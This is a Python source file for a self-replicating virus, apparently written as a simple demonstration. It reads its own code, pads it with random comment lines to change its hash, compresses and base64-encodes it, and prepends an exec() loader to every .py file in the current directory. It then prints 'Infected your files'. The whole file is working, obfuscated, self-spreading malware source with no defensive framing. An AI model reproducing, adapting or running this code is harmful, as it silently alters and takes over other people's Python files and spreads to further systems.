# hash-5bc02cefb3ea9e27f1a6776eabd1935d
import base64
import glob
import hashlib
import os
import random
import zlib

def get_contents(file, hash=None):
    #holder for file contents
    content = None
    #opens file and reads lines into data
    with open(file, "r") as my_file:
        content = my_file.readlines()
    #checks if the lines contain the correct hash 
    for line in content:
        if hash:
            if hash in line:
                return None
    #returns the files contents
    return content

def hide(virus):
    #holder for virus code with random numbers added to change hash
    new_code = []
    for line in virus:
        #adds random number
        new_code.append("# "+ str(random.randrange(1000000))+ "\n")
        #adds original virus code
        new_code.append(line + "\n")
    #compresses and encodes the virus to hide it
    hidden_virus = base64.urlsafe_b64encode(zlib.compress(bytes("".join(new_code), 'utf-8'), 9))
    return hidden_virus

def infect(file, virus):
    #takes hash of file later used to see if it is already infected
    hash = hashlib.md5(file.encode("utf-8")).hexdigest()

    #gets contents of target file
    #if empty it is already infected and the rest will skip 
    #if not it will replicate on file
    content = get_contents(file, hash)
    if content:
        runner = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(hide(virus))+")))\")"

        with open(file, "w") as f:
            f.write("# hash-"+ hash + "\n" + runner + "\n")
            f.writelines(content)

def get_virus():
  infected = False
  virus = []

  virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
  contents = get_contents(__file__)

  for line in contents:
    if "# hash-" + virus_hash in line:
      infected = True

    if infected:
      virus.append(line + "\n")

    if "# hash-" + virus_hash in line:
      infected = False
      break

  return virus


def main():

  virus = get_virus()

  for file in glob.glob('*.py'):
    infect(file, virus)

  print("Infected your files")

main()
